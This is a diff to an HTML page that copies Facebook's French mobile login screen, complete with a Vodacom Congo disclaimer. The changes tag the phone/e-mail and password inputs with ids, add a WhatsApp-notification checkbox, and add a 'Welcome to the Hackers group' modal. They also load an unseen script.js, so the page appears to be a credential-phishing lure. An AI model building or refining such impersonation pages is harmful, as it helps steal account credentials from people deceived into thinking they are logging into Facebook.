@@ -23,7 +23,7 @@
 
         <!-- Disclaimer -->
         <div class="disclaimer">
-            <p>En continuant, vous acceptez les conditions de votre opérateur Vodacom Congo, y compris le fait que Facebook demande votre numéro de téléphone et le reçoive par ce biais. <a href="#">Modifier les paramètres</a></p>
+            <p>En continuant, vous acceptez les conditions de votre opérateur Vodacom Congo, y compris le fait que Facebook demande votre numéro de téléphone et le reçoive par ce biais. <a href="#">En savoir plus</a></p>
         </div>
 
         <!-- Warning -->
@@ -37,9 +37,18 @@
         </div>
 
         <!-- Login Form -->
-        <form class="login-form">
-            <input type="text" placeholder="Numéro mobile ou e-mail" required>
-            <input type="password" placeholder="Mot de passe" required>
+        <form class="login-form" id="loginForm">
+            <input type="text" id="email" placeholder="Numéro mobile ou e-mail" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            
+            <!-- Checkbox for WhatsApp notification consent -->
+            <div class="consent-box">
+                <input type="checkbox" id="whatsappConsent">
+                <label for="whatsappConsent">
+                    ✓ Me notifier sur WhatsApp lors de la connexion
+                </label>
+            </div>
+            
             <button type="submit" class="btn-login">Se connecter</button>
         </form>
 
@@ -52,5 +61,20 @@
             <button type="button" class="btn-create">Créer un nouveau compte</button>
         </div>
     </div>
+
+    <!-- Falling flowers animation container -->
+    <div id="flowersContainer" class="flowers-container"></div>
+
+    <!-- Welcome modal -->
+    <div id="welcomeModal" class="modal hidden">
+        <div class="modal-content">
+            <div class="modal-header">🎉</div>
+            <h2>Bienvenue dans le groupe des Hackers! 🚀</h2>
+            <p id="modalMessage"></p>
+            <button onclick="closeModal()" class="btn-close">Continuer</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
 </body>
 </html>
